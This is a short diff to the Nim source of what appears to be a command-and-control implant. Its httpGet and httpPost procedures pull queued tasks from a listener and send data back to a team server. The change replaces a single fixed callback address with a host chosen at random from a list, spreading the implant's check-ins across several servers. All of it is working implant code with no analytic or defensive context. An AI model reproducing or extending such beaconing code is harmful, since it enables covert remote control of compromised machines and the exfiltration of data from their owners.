@@ -48,7 +48,10 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        let responseBody = waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint[0..^2]}")
+        # Select random callback host
+        let hosts = ctx.hosts.split(";")
+        let host = hosts[rand(hosts.len() - 1)]
+        let responseBody = waitFor client.getContent(fmt"http://{host}/{endpoint[0..^2]}")
     
         # Return if no tasks are queued
         if responseBody.len <= 0: 
@@ -94,7 +97,10 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
 
     try:
         # Send post request to team server
-        discard waitFor client.request(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint}", requestMethod, body)
+        # Select random callback host
+        let hosts = ctx.hosts.split(";")
+        let host = hosts[rand(hosts.len() - 1)]
+        discard waitFor client.request(fmt"http://{host}/{endpoint}", requestMethod, body)
     
     except CatchableError as err:
         echo "[-] " & err.msg 
